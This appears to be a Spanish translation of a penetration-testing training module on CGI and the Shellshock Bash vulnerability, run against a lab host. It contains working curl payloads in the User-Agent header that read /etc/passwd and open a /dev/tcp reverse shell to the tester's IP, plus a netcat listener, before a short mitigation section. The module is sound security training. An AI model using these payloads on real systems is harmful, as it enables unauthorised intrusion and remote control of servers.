 [Common Gateway Interface (CGI)](https://www.w3.org/CGI/) se utiliza para ayudar a un servidor web a renderizar páginas dinámicas y crear una respuesta personalizada para el usuario que realiza una solicitud a través de una aplicación web. Las aplicaciones CGI se utilizan principalmente para acceder a otras aplicaciones que se ejecutan en un servidor web. CGI es esencialmente middleware entre servidores web, bases de datos externas y fuentes de información. Los scripts y programas CGI se guardan en el directorio `/CGI-bin` en un servidor web y pueden estar escritos en C, C++, Java, PERL, etc. Los scripts CGI se ejecutan en el contexto de seguridad del servidor web. A menudo se utilizan para libros de visitas, formularios (como correo electrónico, retroalimentación, registro), listas de correo, blogs, etc. Estos scripts son independientes del lenguaje y se pueden escribir de manera muy simple para realizar tareas avanzadas mucho más fácilmente que escribirlas utilizando lenguajes de programación del lado del servidor.

Los scripts/aplicaciones CGI se utilizan típicamente por algunas razones:

- Si el servidor web debe interactuar dinámicamente con el usuario.
- Cuando un usuario envía datos al servidor web al completar un formulario. La aplicación CGI procesaría los datos y devolvería el resultado al usuario a través del servidor web.

Una representación gráfica de cómo funciona CGI se puede ver a continuación.

![image](https://academy.hackthebox.com/storage/modules/113/cgi.gif)

[Fuente del gráfico](https://www.tcl.tk/man/aolserver3.0/cgi.gif)

En términos generales, los pasos son los siguientes:

- Se crea un directorio en el servidor web que contiene los scripts/aplicaciones CGI. Este directorio se llama típicamente `CGI-bin`.
- El usuario de la aplicación web envía una solicitud al servidor a través de una URL, es decir, https://acme.com/cgi-bin/newchiscript.pl
- El servidor ejecuta el script y pasa la salida resultante de vuelta al cliente web.

Hay algunas desventajas en su uso: El programa CGI inicia un nuevo proceso para cada solicitud HTTP, lo que puede consumir mucha memoria del servidor. Se abre una nueva conexión a la base de datos cada vez. Los datos no se pueden almacenar en caché entre cargas de páginas, lo que reduce la eficiencia. Sin embargo, los riesgos y las ineficiencias superan los beneficios, y CGI no ha mantenido el ritmo de los tiempos y no ha evolucionado para funcionar bien con aplicaciones web modernas. Ha sido reemplazado por tecnologías más rápidas y seguras. Sin embargo, como testers, nos encontraremos con aplicaciones web de vez en cuando que aún usan CGI y a menudo lo veremos cuando encontremos dispositivos embebidos durante una evaluación.

---

## CGI Attacks

Quizás el ataque CGI más conocido es la explotación de la vulnerabilidad Shellshock (también conocida como "Bash bug") a través de CGI. La vulnerabilidad Shellshock ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) fue descubierta en 2014, es relativamente simple de explotar y aún se puede encontrar en la naturaleza (durante pruebas de penetración) de vez en cuando. Es un fallo de seguridad en el shell Bash (GNU Bash hasta la versión 4.3) que se puede utilizar para ejecutar comandos no intencionados utilizando variables de entorno. En el momento del descubrimiento, era un bug de 25 años de antigüedad y una amenaza significativa para las empresas de todo el mundo.

---

## Shellshock via CGI

La vulnerabilidad Shellshock permite a un atacante explotar versiones antiguas de Bash que guardan incorrectamente las variables de entorno. Típicamente, al guardar una función como una variable, la función del shell se detendrá donde el creador define que termine. Las versiones vulnerables de Bash permitirán que un atacante ejecute comandos del sistema operativo que se incluyan después de una función almacenada dentro de una variable de entorno. Veamos un ejemplo simple donde definimos una variable de entorno e incluimos un comando malicioso después.



```bash
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

Cuando se asigna la variable anterior, Bash interpretará la porción `y='() { :;};'` como una definición de función para una variable `y`. La función no hace nada pero devuelve un código de salida `0`, pero cuando se importa, ejecutará el comando `echo vulnerable-shellshock` si la versión de Bash es vulnerable. Este (u otro comando, como un one-liner de reverse shell) se ejecutará en el contexto del usuario del servidor web. La mayoría de las veces, este será un usuario como `www-data`, y tendremos acceso al sistema pero aún necesitaremos escalar privilegios. Ocasionalmente, tendremos mucha suerte y obtendremos acceso como el usuario `root` si el servidor web se ejecuta en un contexto elevado.

Si el sistema no es vulnerable, solo se imprimirá `"not vulnerable"`.



```bash
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

not vulnerable
```

Este comportamiento ya no ocurre en un sistema parcheado, ya que Bash no ejecutará código después de que se importe una definición de función. Además, Bash ya no interpretará `y=() {...}` como una definición de función. En su lugar, las definiciones de funciones dentro de variables de entorno ahora deben tener el prefijo `BASH_FUNC_`.

---

## Hands-on Example

Veamos un ejemplo práctico para ver cómo, como pentesters, podemos encontrar y explotar esta falla.

### Enumeration - Gobuster

Podemos buscar scripts CGI utilizando una herramienta como `Gobuster`. Aquí encontramos uno, `access.cgi`.



```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
2023/03/23 09:26:04 Starting gobuster in directory enumeration mode
===============================================================
/access.cgi           (Status: 200) [Size: 0]
                                             
===============================================================
2023/03/23 09:26:29 Finished

```

A continuación, podemos usar cURL para el script y notar que no se nos devuelve nada, por lo que quizás sea un script defectuoso pero aún vale la pena explorar más.



```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi

HTTP/1.1 200 OK
Date: Thu, 23 Mar 2023 13:28:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html
```

### Confirming the Vulnerability

Para verificar la vulnerabilidad, podemos usar un simple comando `cURL` o usar Burp Suite Repeater o Intruder para fuzzear el campo user-agent. Aquí podemos ver que se nos devuelven los contenidos del archivo `/etc/passwd`, confirmando así la vulnerabilidad a través del campo user-agent.



```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
system

d-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:112:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash
```

### Exploitation to Reverse Shell Access

Una vez que se ha confirmado la vulnerabilidad, podemos obtener acceso a shell reverso de muchas maneras. En este ejemplo, usamos un simple one-liner de Bash y obtenemos una devolución de llamada en nuestro listener de Netcat.



```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

A partir de aquí, podríamos comenzar a buscar datos sensibles o intentar escalar privilegios. Durante una prueba de penetración de red, podríamos intentar usar este host para pivotar más en la red interna.



```bash
sudo nc -lvnp 7777

listening on [any] 7777 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
www-data@htb:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@htb:/usr/lib/cgi-bin$
```

---

## Mitigation

Este [blog post](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability) contiene consejos útiles para mitigar la vulnerabilidad Shellshock. La forma más rápida de remediar la vulnerabilidad es actualizar la versión de Bash en el sistema afectado. Esto puede ser más complicado en sistemas Ubuntu/Debian de fin de vida útil, por lo que un administrador de sistemas puede necesitar primero actualizar el gestor de paquetes. Con ciertos sistemas (por ejemplo, dispositivos IoT que usan CGI), actualizar puede no ser posible. En estos casos, sería mejor primero asegurarse de que el sistema no esté expuesto a Internet y luego evaluar si el host puede ser dado de baja. Si es un host crítico y la organización elige aceptar el riesgo, una solución temporal podría ser aislar el host en la red interna lo mejor posible. Tenga en cuenta que esto es solo poner una curita en una herida grande, y la mejor acción sería actualizar o desconectar el host.

---

## Closing Thoughts

Shellshock es una vulnerabilidad heredada que ahora tiene casi una década de antigüedad. Pero solo por su antigüedad, eso no significa que no la encontraremos ocasionalmente. Si te encuentras con alguna aplicación web que use scripts CGI durante tus evaluaciones (especialmente dispositivos IoT), definitivamente vale la pena investigarla utilizando los pasos mostrados en esta sección. ¡Podrías tener un punto de apoyo relativamente simple esperándote!